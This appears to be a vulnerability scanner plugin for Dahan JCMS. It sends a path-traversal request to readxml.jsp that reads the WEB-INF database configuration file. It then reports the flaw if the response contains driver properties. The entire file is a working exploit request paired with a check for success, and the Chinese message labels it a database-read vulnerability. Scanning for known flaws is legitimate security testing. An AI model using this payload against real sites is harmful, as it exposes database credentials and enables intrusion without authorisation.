#request url = var
#define payload = /jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig
#define bug = <driver-properties>
#define info = 存在大汉版通JCMS数据库读取漏洞

function main(args)
{
	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	if(StrFindStr(res[0],bug,0)!= "-1")
	{
		print(url.info);
	}
}
